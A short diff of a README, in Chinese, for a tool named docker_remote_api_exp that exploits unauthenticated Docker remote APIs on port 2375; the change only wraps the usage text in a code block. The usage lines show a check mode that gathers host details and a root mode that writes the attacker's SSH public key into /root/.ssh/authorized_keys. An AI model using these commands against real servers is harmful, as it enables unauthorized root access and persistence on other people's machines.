@@ -1,6 +1,8 @@
 ## Docker remote api exp
 ### 参数说明
-$ ./docker_remote_api_exp 
+
+```bash
+./docker_remote_api_exp 
 Usage of ./docker_remote_api_exp:
   -pubkey string
     	id_rsa.pub file (default "/home/hartnett/.ssh/id_rsa.pub")
@@ -24,6 +26,7 @@ Usage of ./docker_remote_api_exp:
 	1.6.x		1.18
 
  (default "1.12")
+ ```
 
 1. remote_api_exp -type=check -target=ip:2375，获取服务器信息，如操作系统，机器名，remote api版本以及docker的安装位置等
 1. ./remote_api_exp -type=root -target=ip:2375 -version=1.12.3，在/root/.ssh/authorized_keys写入攻击者的ssh公钥
